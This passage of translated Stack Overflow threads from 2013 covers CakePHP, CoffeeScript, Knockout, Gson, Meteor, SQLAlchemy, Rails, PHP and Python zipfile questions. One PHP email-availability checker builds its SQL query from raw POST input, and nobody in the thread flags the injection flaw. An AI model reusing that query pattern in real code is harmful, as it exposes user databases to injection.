我还注意到，在我的`Game model`那个`Us`和`Them`列在`$belongsTo`数组中，而不是`$hasMany`直观地看起来更正确。

想法？我将不胜感激！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T20:45:10.300

您只需要别名和正确的关联定义是对的。这就是你需要的。

```
class Game extends AppModel {
    public $belongsTo = array(
        'Us' => array(
            'className' => 'Team',
            'foreignKey' => 'us'
        ),
        'Them' => array(
            'className' => 'Team',
            'foreignKey' => 'them'
        ),
    );  
} 
```

Bake 无法帮助您解决这个问题。如果所有命名都符合约定，那么它只能做出有根据的猜测，在这种情况下这是不可能的。

# coffeescript - 如何在 CoffeeScript 中编写 jQuery(function($) {...}

> ID：16091876
> 
> 赞同：0
> 
> 时间：2013-04-18T19:52:53.037
> 
> 标签：coffeescript

在[本教程](https://stripe.com/docs/tutorials/forms)中，它包含以下代码：

```
jQuery(function($) {
    // do stuff ...
}); 
```

我如何在 CoffeeScript 中写这个？ `jQuery($) ->`不对，但我不知道是什么。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:54:34.333

如果我没记错的话，就像这样：`$ ->`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-18T19:55:50.477

您必须在`jQuery`创建匿名函数后添加一个空格，`$`并将其作为唯一参数：

```
jQuery ($) ->
    foo(); 
```

结果：

```
jQuery(function($) {
  return foo();
}); 
```

# javascript - 如何在模板中基于 mouseover/mouseout 绑定可见性

> ID：16091879
> 
> 赞同：0
> 
> 时间：2013-04-18T19:53:03.897
> 
> 标签：javascript, knockout.js

我正在尝试确定一种基于鼠标事件显示或隐藏链接的方法。从 JSFiddle，我似乎无法让它工作。这是我到目前为止所拥有的：

HTML：

```
<ul multiple="multiple">  
    <!-- ko foreach: list -->   
    <li data-bind="event: {mouseover: $parent.showDelete, mouseout: $parent.hideDelete}">
        <div >
            <span style="vertical-align: center; height: 25px;" 
            data-bind="text: name"></span>
            <a data-bind="visible: $data.deleteVisible" href="#">Remove</a>
        </div>
    </li>        
    <!-- /ko -->
</ul>
<p>
    <button data-bind="click: addItem">Add</button>
    <button data-bind="click: removeItem">Remove</button>
</p> 
```

JS：

```
$(function() {

    var data = [ {name: "Bob"}, {name: "Joe"}, {name: "John"} ]; 
    var viewModel = {
        list: ko.observableArray(data),
        deleteVisible: ko.observable(false), 
        addItem: function() {
            this.list.push({name: "Steve"});                       
        },
        removeItem: function() {
            this.list.pop();
        } ,        
        showDelete: function() {
            this.deleteVisible(true);
        },        
        hideDelete: function() {
            this.deleteVisible(false);
        }        
    };
    ko.applyBindings(viewModel);    
}); 
```

我知道绑定工作正常，因为数据显示并且链接被隐藏。但是，当我将鼠标悬停或鼠标移出时，我在控制台中收到以下错误：

```
Uncaught TypeError: Object #<Object> has no method 'deleteVisible' 
    viewModel.hideDelete
    (anonymous function)
    jQuery.event.dispatch
    elemData.handle 
```

所以错误来自我的视图模型中的“hideDelete”。知道我做错了什么吗？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T20:54:12.873

您是否尝试过使用自我参考制作视图模型？

```
$(function() {

var data = [ {name: "Bob"}, {name: "Joe"}, {name: "John"} ]; 
function viewModel (){
    var self = this; 
    self.list = ko.observableArray(data);
    self.deleteVisible = ko.observable(false);
    self.addItem = function() {
        self.list.push({name: "Steve"});                       
    };
    self.removeItem = function() {
        self.list.pop();
    };        
    self.showDelete = function() {
        self.deleteVisible(true);
    };        
    self.hideDelete = function() {
        self.deleteVisible(false);
    };        
};
ko.applyBindings(viewModel); 
```

});

# json - 将 json 解析为 java 对象时出错：期望数字，得到字符串

> ID：16091881
> 
> 赞同：1
> 
> 时间：2013-04-18T19:53:04.007
> 
> 标签：json, gson

我正在调用一个服务，它将响应作为 json 返回并使用 Gson 将它们转换为 Java 对象。在 50 个案例中的 47 个中，我得到了 Java 对象，但是在 3 个案例中，我得到了以下错误：

```
com.google.gson.JsonSyntaxException: Expecting number, got: STRING
    at com.google.gson.internal.bind.TypeAdapters$11.read(TypeAdapters.java:304)
    at com.google.gson.internal.bind.TypeAdapters$11.read(TypeAdapters.java:293)
    at com.google.gson.internal.bind.ReflectiveTypeAdapterFactory$1.read(ReflectiveTypeAdapterFactory.java:93)
    at com.google.gson.internal.bind.ReflectiveTypeAdapterFactory$Adapter.read(ReflectiveTypeAdapterFactory.java:172)
    at com.google.gson.internal.bind.TypeAdapterRuntimeTypeWrapper.read(TypeAdapterRuntimeTypeWrapper.java:40)
    at com.google.gson.internal.bind.CollectionTypeAdapterFactory$Adapter.read(CollectionTypeAdapterFactory.java:81)
    at com.google.gson.internal.bind.CollectionTypeAdapterFactory$Adapter.read(CollectionTypeAdapterFactory.java:60)
    at com.google.gson.internal.bind.ReflectiveTypeAdapterFactory$1.read(ReflectiveTypeAdapterFactory.java:93)
    at com.google.gson.internal.bind.ReflectiveTypeAdapterFactory$Adapter.read(ReflectiveTypeAdapterFactory.java:172)
    at com.google.gson.Gson.fromJson(Gson.java:795)
    at com.google.gson.Gson.fromJson(Gson.java:761)
    at com.google.gson.Gson.fromJson(Gson.java:710)
    at com.google.gson.Gson.fromJson(Gson.java:682) 
```

在这里可以看到一个失败的 json 响应：http: [//ec2-50-112-212-186.us-west-2.compute.amazonaws.com/ske.json](http://ec2-50-112-212-186.us-west-2.compute.amazonaws.com/ske.json)。我的 Java bean 如下：

```
import java.util.List;

import com.google.gson.annotations.SerializedName;

public class WordSketch{

    @SerializedName("Gramrels")
    private List<Gramrel> gramrels;

    public List<Gramrel> getGramrels(){
        return this.gramrels;
    }
    public void setGramrels(List<Gramrel> gramrels){
        this.gramrels = gramrels;
    }

    public static class Gramrel {

        @SerializedName("Words")
        private List<Word> words;
        private Number count;
        private String name;
        private Number score;
        private Number seek;

        public List<Word> getWords(){
            return this.words;
        }
        public void setWords(List<Word> words){
            this.words = words;
        }
        public Number getCount(){
            return this.count;
        }
        public void setCount(Number count){
            this.count = count;
        }
        public String getName(){
            return this.name;
        }
        public void setName(String name){
            this.name = name;
        }
        public Number getScore(){
            return this.score;
        }
        public void setScore(Number score){
            this.score = score;
        }
        public Number getSeek(){
            return this.seek;
        }
        public void setSeek(Number seek){
            this.seek = seek;
        }
    }

    public static class Word {
        private Number count;
        private Number id;
        private String lempos;
        private Number score;
        private Number seek;
        private String word;

        public Number getCount(){
            return this.count;
        }
        public void setCount(Number count){
            this.count = count;
        }
        public Number getId(){
            return this.id;
        }
        public void setId(Number id){
            this.id = id;
        }
        public String getLempos(){
            return this.lempos;
        }
        public void setLempos(String lempos){
            this.lempos = lempos;
        }
        public Number getScore(){
            return this.score;
        }
        public void setScore(Number score){
            this.score = score;
        }
        public Number getSeek(){
            return this.seek;
        }
        public void setSeek(Number seek){
            this.seek = seek;
        }
        public String getWord(){
            return this.word;
        }
        public void setWord(String word){
            this.word = word;
        }
    }
} 
```

实际的 gson 调用是`gson.fromJson(json, WordSketch.class)`.

谁能指出什么是错误的，或者至少给我一些关于如何调试（快速）的信息，因为我不知道在 json 的哪个部分，gson 失败了？

非常感谢，

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-18T20:38:56.877

通过观察您的 JSON，我意识到某些字段通常具有数值，有时它们具有空字符串作为值。

例如，响应中的第 3 个*gramrel*是：

```
{
    "count": "",
    "colbreak": 1,
    "name": "unary rels",
    "score": "",
    "Words": [
        {
            "count": 6,
            "word": "prp_għaċ-",
            "name": "prp_għaċ-",
            "score": 9.1,
            "Words": [ ],
            "seek": 2231297
        }
    ],
    "seek": 0
}, 
```

正如您在课堂上定义`count`的`score`类型`Number`一样，GSON 抱怨！

* * *

*编辑*：我建议您将类中的所有字段都设置为类型`String`，然后您可以根据需要对其进行转换...我的意思是，您可以将编写的类用作*响应包装*类，然后创建您的实际该响应类的类...

```
WordSketch ws = gson.fromJson(json, WordSketch.class);
for (Gramrel g in ws.getGramrels) {
    Number count = //convert the String into Number...
    //etc...
    MyGrammel myGrammel = new MyGrammel(count, ...);
} 
```

在此示例中，您的`Gramrel`类只是一个用于*包装*响应的临时类，并且`MyGramrel`是您将使用的实际类（具有 type 属性的类`Number`）...。

# java - 在java中配置控制器以绕过系统代理

> ID：16091882
> 
> 赞同：0
> 
> 时间：2013-04-18T19:53:05.583
> 
> 标签：java, http-proxy

我有

```
public void test(String domain, String version, HttpServletResponse response)
        throws IOException {
    String strUrl = domain + "?get-wms-list.go?" + "service=web&version=" + version
        + "&request=GetCapabilities";
    log.info("download " + strUrl);
    pass(strUrl, response);
} 
```

但是，系统代理设置一直阻止我访问上述内容。

# android - 发送 base64 编码的图像会导致图像损坏

> ID：16091883
> 
> 赞同：2
> 
> 时间：2013-04-18T19:53:06.850
> 
> 标签：android, json, base64

我正在使用 对图像进行编码`Base64.encodeToString`，将其（以及其他数据片段）添加到 JSON 正文并将其发送到 Web 服务进行存储。

我的编码方法如下所示：

```
private static String encodeToBase64(Bitmap image) {
  Bitmap immagex = image;
  ByteArrayOutputStream baos = new ByteArrayOutputStream();
  immagex.compress(Bitmap.CompressFormat.JPEG, 100, baos);
  byte[] bytes = baos.toByteArray();
  String imageEncoded = Base64.encodeToString(bytes, Base64.DEFAULT);
  return imageEncoded;
} 
```

然后我只需调用`.add("encoded_image", encodeToBase64(bitImage));`并`JSONObject`通过我的网络服务类发送它。

但是，当我在另一边获得图像时，它已损坏。PHP 函数`base64_decode`执行并似乎提供了一个图像，但是当我将该图像写入临时文件时，我无法打开它。它说图像已损坏。我不确定从哪里开始寻找。

我查看了其他线程，但他们的解决方案似乎不起作用。

帮助表示赞赏。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T20:07:57.270

我不认为这些`DEFAULT`选项与您的 PHP 版本混合得很好。在 PHP 的某些版本中似乎存在一个错误，`base64_decode`如果输入格式不正确，该错误就会出现。

尝试添加该`NO_WRAP`选项，以确保生成的输出中没有空格/likebreak 字符。

如果这没有帮助，请查看该功能的[手册](http://php.net/manual/en/function.base64-decode.php)页`base64_decode`以获取有关如何使其工作的提示。

如果您分析了您在 android 中发送并在 php 中接收的内容，也可能会有所帮助，即记录一些调试输出或使用断点进行检查，以查看是否有任何问题。

# javascript - 订阅完成后如何在客户端上运行方法

> ID：16091885
> 
> 赞同：0
> 
> 时间：2013-04-18T19:53:12.033
> 
> 标签：javascript, meteor, publish-subscribe

这是我的设置：

```
//in global.js file
items = new Meteor.Collection("items");

//on server in main.coffee
Meteor.publish "nearItems", (lat, lng) ->
  return items.find( { loc : { $near : [lng, lat] } })

//on client in map.coffee
Meteor.autosubscribe -> 
  Meteor.subscribe( "nearItems", 37.78, -122.416, addMarkers)

addMarkers = ->
  places = items.find().fetch()
  console.log "Adding this many markers:", items.length 
  for item, i in places
    theLatLng = new google.maps.LatLng(item.loc[1], item.loc[0])
    addMarker theLatLng, map, item 
  return 
```

客户端获取数据时如何调用 addMarkers 方法。

文档说我需要调用 ready 方法[http://docs.meteor.com/#meteor_publish](http://docs.meteor.com/#meteor_publish)但我目前的设置我不确定如何执行此操作，因为我无法在 return 语句之前调用 ready 因为它不会准备好了吗。

Meteor.publish 语句工作正常，我得到了客户端上的所有项目。但是加载需要几秒钟。所以我需要一种方法来等到项目集合拥有来自服务器的所有数据。我可以打开 javascript 控制台，等待几秒钟后调用 addMarkers 并在地图上正确显示最近的 100。

我尝试设置 Deps.autorun(runFunc) 请参阅[http://docs.meteor.com/#deps_autorun](http://docs.meteor.com/#deps_autorun) 但无论出于何种原因，它都说集合项目不存在。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-18T23:30:08.027

我不知道您为什么在使用`autorun`. 如果您粘贴有问题的代码，也许我可以提供帮助。我处理这个问题的方式是：

```
Meteor.autorun( =>
  sub = Meteor.subscribe("collection", param1, param2)

  if sub.ready()                  # Ready is reactive. Once it changes 
                                  # the computation is invalidated

    addMarkers()                  # Now the data is at the client
    Session.set("loading", false) # Do your main thing based on "loading"
  else
    Session.set("loading", true)  # Do some reactive waiting based on "loading"
) 
```

# c++ - 使用 unix sendmail 发送电子邮件

> ID：16091889
> 
> 赞同：4
> 
> 时间：2013-04-18T19:53:18.070
> 
> 标签：c++, email, unix, sendmail

`mail`目标是像 php函数一样在 Unix 机器上发送电子邮件。在 StackOverflow 上我已经找到了一个功能，但也许有人可以提出更优雅的解决方案或没有`fprintf`and的解决方案`fwrite`？因为我不在`printf`我的*C++*程序中使用：

```
#include<stdio.h>
#include<errno.h>
int sendmail(const char *to, const char *from, const char *subject, const char *message)
{
    int retval = -1;
    FILE *mailpipe = popen("usr/lib/sendmail -t", "w");
    if (mailpipe != NULL)
    {
        fprintf(mailpipe, "To: %s\n", to);
        fprintf(mailpipe, "From: %s\n" from);
        fprintf(mailpipe, "Subject: %s\n\n", subject);
        fwrite(message, 1, strlen(message), mailpipe);
        fwrite(".\n", 1, 2, mailpipe);
        pclose(mailpipe);
        retval = 0;
     }
     else
     {
         perror("Failed to invoke sendmail”);
     }
     return retval;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-09-24T14:36:40.593

恕我直言，您只有两种方法可以做到这一点。首先是使用 sendmail 子进程。在较低级别，您将通过管道与它进行通信，AFAIK 没有将 C++ 流关联到管道的标准方法。所以你将不得不使用旧的`write`，`fwrite`或者`fprints`输出你的数据。

另一种方法是直接打开一个到 smtp 服务器的套接字并使用 SMTP 协议（​​EHLO 或 HELO，MAIL FROM：，RCPT TO：DATA 和 BYE），处理服务器的响应...... :-( 和无论如何，没有更标准的方法可以从套接字创建 C++ 流！

如果你不想使用 fwrite 和 fprintf 的原因是你不想使用 C 标准库，直接使用系统调用：准备要发送的字符串，用 C++ 字符串或 a `strstream`，并将结果发送到管道直接用write。如果您也不想使用 write，只需问问自己 C++ 库是如何写入文件的...

# sqlalchemy - 未提交检测对象（例如回滚）时的 SQLAlchemy 内存泄漏

> ID：16091891
> 
> 赞同：3
> 
> 时间：2013-04-18T19:53:22.490
> 
> 标签：sqlalchemy

**解决**了不是问题，是由以下原因引起的：

```
def __del__(self):
    print "deleted!" 
```

在模型类中。一旦我从模型类中删除它，我就无法试验任何内存使用问题。

我有一些模型正在与临时会话/引擎一起使用，并且工作正常，但是当我想在数据库/会话上下文之外创建这些对象时，似乎 SQLAlchemy 工具保留了对对象的引用，并且它们永远不会被删除。

我想做的是创建一个模型对象，如“普通”Python 对象，并且从不将其添加到任何会话/数据库中（但在其他上下文中，我需要将其添加到数据库中）。这是错的吗？

```
import gc
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy import Column, String

base = declarative_base()

class SomeObject(base):
    __tablename__ = "SomeObject"

    instrumented_name = Column('name', String(55), primary_key=True)
    uninstrumented_name = None

    def __del__(self):
        print "deleted!"

obj1 = SomeObject()
obj1.uninstrumented_name = "foo"
obj1 = None

#obj1 is properly deleted

obj2 = SomeObject()
obj2.instrumented_name = "bar"
obj2 = None
gc.collect()

#obj2 never deleted 
```

**编辑**我做了一些额外的测试，如果对象从未提交到会话中（例如回滚），SQLAlchemy 似乎会导致内存泄漏

**是否有一种方法可以强制 SQLAlchemy 释放它对检测对象的引用？**

```
import gc
from sqlalchemy.orm import scoped_session, sessionmaker
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy import Column, Integer, String, create_engine

Base = declarative_base()

class MemoryMonster(Base):
    __tablename__ = "MemoryMonster"

    _id = Column('id', Integer(), primary_key=True)
    _name = Column('name', String(55))

    def __init__(self):
        self._name = "some monster name"
        self._eat_some_ram = ' ' * 1048576

    def __del__(self):
        print "deleted!"

engine = create_engine("sqlite:///:memory:")
session_factory = sessionmaker(engine)
Session = scoped_session(session_factory)

Base.metadata.create_all(engine)

def create_and_commit():
    session = Session()
    for _ in range(100):
        session.add(MemoryMonster())
    session.commit()
    Session.remove()
    gc.collect()

def create_and_rollback():
    session = Session()
    for _ in range(100):
        monster = MemoryMonster()
        session.add(monster)
        session.expunge(monster)
    session.rollback()
    Session.remove()
    gc.collect()

def create_do_not_include_in_session():
    session = Session()
    for _ in range(100):
        monster = MemoryMonster()
    session.rollback()
    Session.remove()
    gc.collect()

# Scenario 1 - Objects included in the session and commited
# No memory leak
create_and_commit()

# Scenario 2 - Objects included in the session and rollbacked
# Memory leak
create_and_rollback()

# Scenario 3 - Objects are not not included in the session
# Memory leak
create_do_not_include_in_session() 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-20T06:54:25.123

使用`__del__()`会[造成内存泄漏](http://docs.python.org/2/reference/datamodel.html#object.__del__)，因为如果一个对象成为循环的主体，那么循环 GC 将无法访问它。在这个测试中就是这种情况，因为 SQLAlchemy 对象检测在对象“脏”的情况下创建了一个从对象到自身的循环，即具有待刷新到数据库的属性，因此您可以添加一个会话的脏对象，然后丢失对它的所有引用，并且更改仍将被刷新。一旦对象被标记为干净（即刷新），这个“参考标记”就会被移除。

对于 SQLAlchemy 0.8.1，我[改进了这种行为](http://www.sqlalchemy.org/trac/ticket/2708)：一个是不再为“挂起”或“分离”对象创建此引用循环，即与会话无关的对象。相反，当对象附加到 .modified 标志的 Session 时，会检查该对象，并且仅在该点关联引用标记（并在对象变得干净时被删除，就像已经发生的情况一样）。如果对象从会话中分离，则标记将被无条件删除，即使对象仍有更改 - .modified 标志保持为真。

`__del__()`此外，当一个类第一次被映射并被检测为具有方法时，我添加了一个警告。Python 对象很容易有循环，在 SQLAlchemy 的情况下，将 a`relationship()`放在带有 backref 的类上的模式也会产生创建引用循环的效果，所以即使这里的状态管理改进，使用`__del__()`也是馊主意。

# class - 打印两个函数函数 f1 和 f2 的总和

> ID：16091892
> 
> 赞同：-2
> 
> 时间：2013-04-18T19:53:38.603
> 
> 标签：class, methods, addition, fractions

问题告诉我...编写一个构造 2 个分数 5/7 和 3/8 的主要方法，然后创建 2 个其他分数，其值是原始分数的总和和乘积

```
public class Fraction
{
    int num;

    int den;

    public int sum;

    public int getAddition()
    {
        sum = (this.num + other.num);
        return sum;
    }
}

public class tester
{
    public static void main (String args[])
    {
       Fraction f1 = new Fraction ();

       f1.num = 5;

       f1.den = 7;

       Fraction f2 = new Fraction ();

       f2.num = 3;

       f2.den = 8;

       //Fraction f3 = getAddition();

       Fraction f4 = new Fraction ();
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T20:01:54.273

`other`需要是加法函数的参数，并被其中一个`Fraction`对象调用。如果您想要一个将它们都作为参数的函数，请使用类（静态）方法。在任何情况下，您都不能将 an 分配`int`给一个类。您可以将结果字段分配给调用对象，或者使用新值创建一个新的 Fraction 并返回该对象。

最重要的是，这不是您添加分数的方式。如果基础相同，您将如何添加它们。

# php - 可用性检查器电子邮件不起作用

> ID：16091898
> 
> 赞同：0
> 
> 时间：2013-04-18T19:54:03.780
> 
> 标签：php, mysql, ajax, email

我有一些 ajax 代码将我的电子邮件输入字段发送到服务器，在那里它检查电子邮件是否存在于数据库中。但是，它没有给出任何回应。

**HTML**

```
<input type="text" name="email" id="email" /><span id="emailcheck"></span> 
```

**AJAX**

```
$(document).ready( function () {
    $("#email").change(function(){
    var mail = $("#email").val();
        $.ajax({
            type: "POST",
            url: "check.php",
            data: "email="+ mail,
            succes: function(response){
                if(response == "email not ok"){
                $("#emailcheck").html("<strong>E-mail is already in use</strong>");
            }
        }
    });
});

}); 
```

**PHP检查.php**

```
include_once($pathdb);

if(isset($_POST['email'])){
    $email = $_POST['email'];
    $sql = "SELECT id FROM users WHERE mail='".$email."'";
    $query = mysqli_query($dbconnect, $sql) or die(mysqli_error());
    $email_check = mysqli_num_rows($query);

        if($email_check > 0){
    echo "email not ok";
    }
} 
```

# ruby-on-rails - 使用 ActiveRecord 关系在每行包含一个对象的多个实例

> ID：16091899
> 
> 赞同：0
> 
> 时间：2013-04-18T19:54:12.597
> 
> 标签：ruby-on-rails, ruby, activerecord, relationships

我试图弄清楚如何使用 ActiveRecord 关系来关联一个模型，该模型可以在一行中包含另一个模型的多个实例。例如，在一个模型中拥有 has_many :dogs，在另一个模型中拥有 belongs_to :dog 意味着在一个模型中，“dog_id”将引用 :dog 的实例。但是，我希望能够在我的相关（has_many）模型中拥有多个 :dog 实例，例如 dog_id1、dog_id2、dog_id3 等。请参阅下面的代码以理解我的意思。我怎样才能做到这一点？

我有以下型号：

```
--tp.rb
class Tp < ActiveRecord::Base
  has_many :dogs
  has_many :cats
  has_many :stars
  attr_accessible :dog_id1, :dog_id2, :dog_id3, :dog_id4, :cat_id1, :cat_id2, :cat_id3, :cat_id4, :star_id, :tp_id
end

--dog.rb
class Dog < ActiveRecord::
  belongs_to :tp
  attr_accessible :dog_id, :dog_name
end

--cat.rb
class Cat < ActiveRecord::Base
  belongs_to :tp
  attr_accessible :cat_id, :cat_name
end

--star.rb
 class Star < ActiveRecord::Base
   belongs_to :tp
   attr_accessible :patient_id
 end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T20:06:51.800

I think you have your `belongs_to`/`has_many` a little backwards.

# belongs_to and has_many

For your example,

```
class Tp < ActiveRecord::Base
  has_many :dogs
  has_many :cats
  has_many :stars
end 
```

`Tp` doesn't have any `dog_id`, `cat_id`, or `star_id` in its database row. When you set `belongs_to` in the other models,

```
class Dog < ActiveRecord::Base
  belongs_to :tp
end

class Cat < ActiveRecord::Base
  belongs_to :tp
end

class Star < ActiveRecord::Base
  belongs_to :tp
end 
```

You should add a `tp_id` to each model (`dogs` table, `cats` table, and `stars` table).

Then, calling

```
tp = Tp.find(123) 
```

Finds `Tp` with `id` equal to 123

```
SELECT * FROM tps WHERE id = 123; 
```

And calling

```
cats = tp.cats
dogs = tp.dogs
stars = tp.stars 
```

Finds all `Cat`, `Dog`, and `Star` instances with `tp_id` equal to 123

```
SELECT * FROM cats WHERE tp_id = 123;
SELECT * FROM dogs WHERE tp_id = 123;
SELECT * FROM stars WHERE tp_id = 123; 
```

If you need your `Cat` instances to belong to many `Tp` instances, and `Tp` instances to have many `Cat` instances, then you should look at Rails's [has_and_belongs_to_many](http://api.rubyonrails.org/classes/ActiveRecord/Associations/ClassMethods.html#method-i-has_and_belongs_to_many) or [has_many :through](http://api.rubyonrails.org/classes/ActiveRecord/Associations/ClassMethods.html#method-i-has_many).

# has_and_belongs_to_many

A `has_and_belongs_to` relationship would require new tables `cats_tps`, `dogs_tps`, and `stars_tps`. These tables would have a schema of

```
cats_tps
  cat_id
  tp_id
dogs_tps
  dog_id
  tp_id
stars_tps
  star_id
  tp_id 
```

Then in your models

```
class Tp < ActiveRecord::Base
  has_and_belongs_to_many :dogs
  has_and_belongs_to_many :cats
  has_and_belongs_to_many :stars
end

class Dog < ActiveRecord::Base
  has_and_belongs_to_many :tps
end

class Cat < ActiveRecord::Base
  has_and_belongs_to_many :tps
end

class Star < ActiveRecord::Base
  has_and_belongs_to_many :tps
end 
```

Now, running

```
tp = Tp.find(123)
cats = tp.cats 
```

Generates the SQL

```
SELECT "cats".* FROM "cats" INNER JOIN "cats_tps" ON "cats"."id" = "cats_tps"."cat_id" WHERE "cats_tps"."tp_id" = 123; 
```

Which is essentialy the query (get me a list of all the cat_ids that belong to Tp 123) and then (get me all the cats that match these cat ids).

Generating the `cats_tps` join table can be done with a migration like

```
class CreateCatsTps < ActiveRecord::Migration
  def change
    create_table :cats_tps, :id => false do |t|
      t.belongs_to :cat
      t.belongs_to :tp
    end
  end
end 
```

This works great for simple joins, but you may want to look into using `has_many :through`. This is because the `cats_tps` table holds no information about when or why this `Cat` belongs to a `Tp` or this `Tp` belongs to the `Cat`. Likewise, if you add `Bird`, `Horse`, `Frog`, and `Snake` models, you will have to create `birds_tps`, `horses_tps`, `frogs_tps`, and `snakes_tps` tables. Yuck.

# has_many :through

To create a `has_many :through` relationship, you create a new model that makes sense semantically that links a `Tp` to a `Cat`. For instance, let's say that a `Tp` walks cats. You could create an `Walk` model that links a `Cat` to a `Tp`.

```
class Walk < ActiveRecord::Base
  belongs_to :cat
  belongs_to :tp
  attr_accessible :price, :duration, :interval # these attributes describe the Walk relationship
end

class Cat < ActiveRecord::Base
  has_many :walks
  has_many :tps, :through => :walks
end

class Tp < ActiveRecord::Base
  has_many :walks
  has_many :cats, :through => :walks
end 
```

Now, the relationship is similar to a `has_and_belongs_to_many`, but you can include metadata about the walking relationship. Additionally, say that a `Tp` also walks dogs. You could convert the `belongs_to :cat` into a polymorphic `belongs_to :animal` relationship so that a `Tp` can walk a cat, dog, mouse, rabbit, horse, ... you name it.

```
class Walk < ActiveRecord::Base
  belongs_to :animal, :polymorphic => true
  belongs_to :tp
  attr_accessible :price, :duration, :interval # these attributes describe the Walk relationship
end

class Cat < ActiveRecord::Base
  has_many :walks, :as => :animal
  has_many :tps, :through => :walks
end

class Dog < ActiveRecord::Base
  has_many :walks, :as => :animal
  has_many :tps, :through => :walks
end

class Tp < ActiveRecord::Base
  has_many :walks
  has_many :cats, :through => :walks, :source => :animal, :source_type => 'Cat'
  has_many :dogs, :through => :walks, :source => :animal, :source_type => 'Dog'
end 
```

This relationship is created with a migration like

```
class CreateWalks < ActiveRecord::Migration
  def change
    create_table :walks do |t|
      t.belongs_to :animal, :polymorphic => true
      t.belongs_to :tp
    end
  end
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T19:58:27.573

这是错误的

```
attr_accessible :dog_id1, :dog_id2, :dog_id3, :dog_id4, :cat_id1, :cat_id2, :cat_id3, :cat_id4, :star_id, :tp_id 
```

你的 Dog 模型有一个`tp_id`和`has_many`并且`belongs_to`允许你`tp_instance.dogs`得到一个匹配的 Dog 模型数组`tp_id`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-18T20:01:22.133

`:dog_id(s)`从 TP 模型中移除并放入`:tp_id`您的狗模型。这将允许您从 TP 到 Dog 建立一对多的关系

# php - PHP函数解析多维数组？

> ID：16091901
> 
> 赞同：3
> 
> 时间：2013-04-18T19:54:15.807
> 
> 标签：php, mysql, arrays, multidimensional-array, pdo

我运行查询并`fetchAll()`

```
$query = "SELECT uid, kill_count FROM users WHERE curmid=:mid AND status='1'";
...
$row = $stmt->fetchAll(); 
```

返回此数组：

```
Array ( 
 [0] => Array ( [uid] => 105 [fcount] => 1 ) 
 [1] => Array ( [uid] => 106 [fcount] => 2 ) 
 [2] => Array ( [uid] => 107 [fcount] => 0 ) 
 [3] => Array ( [uid] => 108 [fcount] => 1 ) 
 [4] => Array ( [uid] => 109 [fcount] => 1 ) 
) 
```

我有一个要运行的循环，基本上是：

```
$problist = array();
foreach ($row as $key => $value) {
    if ($value == 0) {
        array_push($problist, $key, $key, $key, $key, $key);
    } elseif ($value == 1) {
        array_push($problist, $key, $key, $key);
    } elseif ($value >= 2) {
        $problist[] = $key;
    }
} 
```

当然，该循环不起作用，因为它没有引用数组中的正确值。在这个假设中，我正在寻找的输出是： `$problist =`

```
array(15) { 
[0]=> string(3) "105" 
[1]=> string(3) "105" 
[2]=> string(3) "105" 
[3]=> string(3) "106" 
[4]=> string(3) "107" 
[5]=> string(3) "107" 
[6]=> string(3) "107" 
[7]=> string(3) "107" 
[8]=> string(3) "107" 
[9]=> string(3) "108" 
[10]=> string(3) "108" 
[11]=> string(3) "108"
[12]=> string(3) "109" 
[13]=> string(3) "109" 
[14]=> string(3) "109" 
} 
```

我已经阅读和修改，然后阅读和修改无法弄清楚要使用哪些 php 函数来完成这项工作。我试过`end()`, `reset()`, `array_shift()`, 和其他的。当然有可能在我的无知中我没有正确使用它们。谢谢您的帮助。

[也许有更好的方法来格式化我的查询？]

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-18T20:05:50.213

```
$problist = array();
foreach ($row as $value) {
    if ($value['fcount'] == 0) {
        array_push($problist, $value['uid'], $value['uid'], $value['uid'], $value['uid'], $value['uid']);
    } elseif ($value['fcount'] == 1) {
        array_push($problist, $value['uid'], $value['uid'], $value['uid']);
    } elseif ($value['fcount'] >= 2) {
        $problist[] = $value['uid'];
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-18T20:01:44.053

您正在遍历整个结果集，因此`$value`数组看起来像：

```
$value = array(
    'uid' => 105,
    'fcount' => 1
); 
```

因此，在您的代码中，您应该使用`$value['uid']`而不是`$key`和`$value['fcount']`而不是`$value`.

# python - python/zip：如果提供了文件的绝对路径，如何消除 zip 存档中的绝对路径？

> ID：16091904
> 
> 赞同：87
> 
> 时间：2013-04-18T19:54:28.263
> 
> 标签：python, zip, absolute-path, zipfile

我在两个不同的目录中有两个文件，一个是`'/home/test/first/first.pdf'`，另一个是`'/home/text/second/second.pdf'`. 我使用以下代码来压缩它们：

```
import zipfile, StringIO
buffer = StringIO.StringIO()
first_path = '/home/test/first/first.pdf'
second_path = '/home/text/second/second.pdf'
zip = zipfile.ZipFile(buffer, 'w')
zip.write(first_path)
zip.write(second_path)
zip.close() 
```

打开我创建的 zip 文件后，里面有一个`home`文件夹，里面有两个子文件夹，`first`然后`second`是 pdf 文件。我不知道如何仅包含两个 pdf 文件，而不是将完整路径压缩到 zip 存档中。我希望我能把我的问题说清楚，请帮忙。谢谢。

* * *

## 回答 #1

> 赞同：177
> 
> 时间：2013-04-19T12:31:53.273

zipfile write() 方法支持一个额外的参数 (arcname)，它是要存储在 zip 文件中的存档名称，因此您只需更改代码：

```
from os.path import basename
...
zip.write(first_path, basename(first_path))
zip.write(second_path, basename(second_path))
zip.close() 
```

当您有空闲时间阅读[zipfile](http://docs.python.org/2/library/zipfile)的文档时会有所帮助。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2016-03-02T14:09:57.393

我使用这个函数来压缩一个不包含绝对路径的目录

```
import zipfile
import os 
def zipDir(dirPath, zipPath):
    zipf = zipfile.ZipFile(zipPath , mode='w')
